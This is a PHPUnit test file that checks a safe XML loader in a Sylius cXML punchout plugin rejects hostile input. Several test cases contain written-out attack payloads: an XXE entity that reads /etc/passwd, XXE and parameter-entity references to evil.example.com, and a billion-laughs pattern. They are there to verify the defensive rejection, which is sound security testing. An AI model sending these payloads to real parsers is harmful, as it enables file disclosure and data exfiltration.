<?php

declare(strict_types=1);

namespace Tests\Tmonier\SyliusPunchoutCxmlPlugin\Unit\Cxml;

use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;
use Tmonier\SyliusPunchoutCxmlPlugin\Cxml\Exception\XmlLoadException;
use Tmonier\SyliusPunchoutCxmlPlugin\Cxml\SafeXmlLoader;

final class SafeXmlLoaderTest extends TestCase
{
    private SafeXmlLoader $loader;

    protected function setUp(): void
    {
        $this->loader = new SafeXmlLoader();
    }

    #[Test]
    public function it_loads_a_valid_xml_document(): void
    {
        $xml = '<?xml version="1.0"?><root><child>text</child></root>';

        $doc = $this->loader->load($xml);

        self::assertInstanceOf(\DOMDocument::class, $doc);
        $firstChild = $doc->documentElement?->firstChild;
        self::assertNotNull($firstChild);
        self::assertSame('child', $firstChild->nodeName);
    }

    #[Test]
    public function it_accepts_cxml_with_external_system_identifier(): void
    {
        $xml = <<<'XML_WRAP'
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE cXML SYSTEM "http://xml.cxml.org/schemas/cXML/1.2.071/cXML.dtd">
        <cXML version="1.2.071" payloadID="test@host" timestamp="2026-10-14T10:00:00+02:00">
            <Header><From><Credential domain="NetworkId"><Identity>x</Identity></Credential></From><To><Credential domain="NetworkId"><Identity>y</Identity></Credential></To><Sender><Credential domain="NetworkId"><Identity>z</Identity></Credential><UserAgent>Test/1.0</UserAgent></Sender></Header>
            <Request><PunchOutSetupRequest operation="create"><BuyerCookie>cookie</BuyerCookie><BrowserFormPost><URL>https://buyer.example.com/return</URL></BrowserFormPost></PunchOutSetupRequest></Request>
        </cXML>
        XML_WRAP;

        // Must NOT throw: external DTD references are allowed (LIBXML_NONET prevents fetch)
        $doc = $this->loader->load($xml);
        self::assertNotNull($doc->documentElement);
        self::assertSame('cXML', $doc->documentElement->nodeName);
    }

    #[Test]
    public function it_rejects_xml_with_file_xxe(): void
    {
        $xml = <<<'XML'
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>
            XML;

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_rejects_xml_with_http_xxe(): void
    {
        $xml = <<<'XML'
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example.com/steal">]>
            <root>&xxe;</root>
            XML;

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_rejects_xml_with_parameter_entity(): void
    {
        $xml = <<<'XML'
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY % param SYSTEM "http://evil.example.com/evil.dtd">%param;]>
            <root/>
            XML;

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_rejects_internal_subset_with_bracket(): void
    {
        $xml = <<<'XML'
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ELEMENT foo ANY >]>
            <foo/>
            XML;

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_rejects_billion_laughs_pattern(): void
    {
        // Reduced billion-laughs: just enough to trigger the ENTITY detection
        $xml = <<<'XML'
            <?xml version="1.0"?>
            <!DOCTYPE lolz [
                <!ENTITY lol "lol">
                <!ENTITY lol2 "&lol;&lol;">
            ]>
            <lolz>&lol2;</lolz>
            XML;

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_rejects_oversized_documents(): void
    {
        $loader = new SafeXmlLoader(100);
        $xml = str_repeat('x', 101);

        $this->expectException(XmlLoadException::class);
        $this->expectExceptionMessage('exceeds');
        $loader->load($xml);
    }

    #[Test]
    public function it_rejects_malformed_xml(): void
    {
        $xml = '<root><unclosed></root>';

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }

    #[Test]
    public function it_does_not_accept_no_doctype_root_without_element(): void
    {
        $xml = '<?xml version="1.0"?><>';

        $this->expectException(XmlLoadException::class);
        $this->loader->load($xml);
    }
}
